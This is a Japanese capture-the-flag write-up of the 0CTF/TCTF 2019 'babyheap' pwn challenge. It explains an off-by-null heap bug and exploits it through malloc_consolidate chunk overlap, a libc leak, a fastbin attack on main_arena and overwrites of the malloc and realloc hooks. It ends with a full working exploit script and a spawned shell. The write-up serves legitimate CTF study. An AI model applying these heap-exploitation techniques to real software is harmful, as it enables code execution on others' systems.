# [pwn 550pts] babyheap - 0CTF/TCTF 2019 Quals
64ビットバイナリで，セキュリティ機構が有効になっています．
```
$ checksec -f babyheap
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               2       babyheap
```
はじめにsetupでランダムなアドレスにRW領域を確保し、その中のランダムなオフセットを返します。以降そのアドレス(mgr)をベースに何やかんやが行われます。
```c
typedef struct {
  long is_used;
  long size;
  char *ptr;
} Note;
```
allocateではサイズが1から0x58までのnoteをcallocできます。最大16個までを同時に確保できます。
updateではis_usedが1のnoteに対して、元のサイズ以下のサイズであればreadできます。
deleteではis_usedが1のnoteに対して、is_used, sizeを0にして、最後にfreeしてptrもNULLにします。
最後にviewではis_usedが1のnoteに対して、sizeだけwriteします。
ということでメイン機能には脆弱性がなさそうです。あとは細かいreadやインデックスチェックを見ていきます。するとupdateのreadlineにoff-by-nullがあることが分かります。

さて、off-by-nullがあるのですが問題があります。確保できるサイズは1から0x58までなので、fastbinのサイズ自体が0になってしまい何も意味が無いということです。pbのwriteup（参考文献[1]）によると、topのサイズを書き換えることでmalloc_condsolidateを呼ぶようです。これによりfree済みのfastbinがくっついてunsorted binに入ります。そのためにsetupで`malloc(0x1f000);`してたんですね〜。

まず、次のようにしてサイズ0x2b0のunsorted binを作り、それをoff-by-nullで0x200にします。
```python
# evict tcache
for i in range(7):
    allocate(0x28)
    update(i, 'A' * 0x28) # make it fast to shrink top
for i in range(7):
    delete(i)
for i in range(7):
    allocate(0x48)
    update(i, 'B' * 0x48)
for i in range(7):
    delete(i)
# now top->size == 0x1000

# allocate chunks for overlap
for i in range(15):
    allocate(0x28)
    update(i, 'C' * 0x28)
for i in range(15):
    delete(i)

for i in range(7):
    allocate(0x18) # 0 - 6
    update(i, str(i) * 0x17)
# now top->size == 0x21
allocate(0x18) # 7

# unsortedbin: size == 0x2b0 (0x30 * 15 - 0x20)
update(7, '7' * 0x18) # make it 0x200
```
さらに次のようにしてチャンクをoverlapさせます。
```python
# unsortedbin: size == 0x2b0 (0x30 * 15 - 0x20)
update(7, '7' * 0x18) # make it 0x200
allocate(0x18) # 8
allocate(0x18) # 9
for i in range(10, 15):
    allocate(0x48)
delete(9)
for i in range(1, 7):
    delete(i)
delete(0) # linked to fastbin
delete(8) # linked to fastbin
# now top->size == 0x31
allocate(0x38)
```
ここでindex=8のチャンクは最初にmalloc_consolidateしてindex=7を確保した直後のunsorted binから取った場所です。一方index=0はconsolidateしたfastbin群の直後にあった場所なので、prev_inuseは0でprev_sizeは0x2b0になっています。したがって、malloc_consolidateが呼ばれると、index=0のチャンクを見てprev_inuseが0になっていることと、prev_sizeが0x2b0なことからindex=8のチャンクを参照します。ここはprev_inuseが1になっているのでconsolidateされてunsorted binができます。そしてunsorted binとなった場所にはindex=10〜14のチャンクがあるのでoverlapしています。
こうして無事libcのアドレスが得られたので、次はRIPを制御する方法を考えましょう。
0x58までしか確保できないので直接fdをmalloc hook等に向けることはできません。そこで一旦main arenに向けます。overlapしたチャンクを2つ（サイズ0x20, 0x50）を用意し、前者はfdを0x51に、後者はfdをmain_arena + 8に向けます。そうすればmain_arena+8が使われる際に正しいサイズが用意されているので落ちません。
さて、これで任意のサイズで任意のアドレスを返すことができますが、やはり0x58までしか確保できないので`__free_hook`も`__malloc_hook`もそのままでは使えません。
と思ったのですが、topはサイズチェックがカスなので`__malloc_hook`前にあるアドレスをサイズとして認識させることができます。
あとはone gadgetを実行するだけですが、適切なone gadgetが存在しません。そのためのsvc_runということで、こちらを経由してrealloc hookからone gadgetを呼びましょう。
```python
from ptrlib import *

def allocate(size):
    sock.sendlineafter(": ", "1")
    sock.sendlineafter(": ", str(size))
    return
def update(index, data):
    sock.sendlineafter(": ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(len(data)))
    sock.sendafter(": ", data)
    return
def delete(index):
    sock.sendlineafter(": ", "3")
    sock.sendlineafter(": ", str(index))
    return
def view(index):
    sock.sendlineafter(": ", "4")
    sock.sendlineafter(": ", str(index))
    sock.recvuntil(": ")
    return sock.recvline()

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./babyheap", env={"LD_LIBRARY_PATH": "./"})
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x4f322

# evict tcache
for i in range(7):
    allocate(0x28)
    update(i, 'A' * 0x28) # make it fast to shrink top
for i in range(7):
    delete(i)
for i in range(7):
    allocate(0x48)
    update(i, 'B' * 0x48)
for i in range(7):
    delete(i)
# now top->size == 0x1000

# allocate chunks for overlap
for i in range(15):
    allocate(0x28)
    update(i, 'C' * 0x28)
for i in range(15):
    delete(i)

for i in range(7):
    allocate(0x18) # 0 - 6
    update(i, str(i) * 0x17)
# now top->size == 0x21
allocate(0x18) # 7

# unsortedbin: size == 0x2b0 (0x30 * 15 - 0x20)
update(7, '7' * 0x18) # make it 0x200
allocate(0x18) # 8
allocate(0x18) # 9
for i in range(10, 15):
    allocate(0x48)
delete(9)
for i in range(1, 7):
    delete(i)
delete(0) # linked to fastbin
delete(8) # linked to fastbin
# now top->size == 0x31
allocate(0x38) # 0

# leak libc
libc_base = u64(view(10)[:8]) - libc_main_arena - 0x60
logger.info("libc = " + hex(libc_base))

# house of spirit
allocate(0x48) # 1
allocate(0x48) # 2 == 11
allocate(0x18) # 3
delete(3)
update(12, p64(0x51))
allocate(0x18) # 3 (this will write 0x51 to main_arena+16 == fastbin[0])

delete(2)
update(11, p64(libc_base + libc_main_arena + 0x8))
allocate(0x48) # 2

# overwrite fastbin[1]
allocate(0x48) # 4 == main_arena + 0x18
payload = b''
payload += p64(libc_base + libc_main_arena + 0x50)
payload += b'\x00' * 0x38
payload += p64(0x31)
update(4, payload)

# overwrite top
allocate(0x28) # 5
payload = p64(libc_base + libc.symbol("__malloc_hook") - 0x28)
payload += p64(0)
payload += p64(libc_base + libc_main_arena + 96) * 2
payload += p64(libc_base + libc_main_arena + 112)
update(5, payload)

# overwrite __realloc_hook & __malloc_hook
allocate(0x58) # 6
payload = b'\x00'*0x10
payload += p64(libc_base + libc_one_gadget) # __realloc_hook
payload += p64(libc_base + libc.symbol("svc_run") + 0x42) # __malloc_hook
update(6, payload)

# get the shell!
sock.sendlineafter(": ", "1")
sock.sendlineafter(": ", "1")

sock.interactive()
```

やったぜ。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=32457)
[+] <module>: libc = 0x7ffff79e4000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
babyじゃないよね。でも凄い面白かったです。

# 参考文献
[1] [https://github.com/perfectblue/ctf-writeups/tree/master/0ctf-Quals-2019/Baby%20Heap%202019](https://github.com/perfectblue/ctf-writeups/tree/master/0ctf-Quals-2019/Baby%20Heap%202019)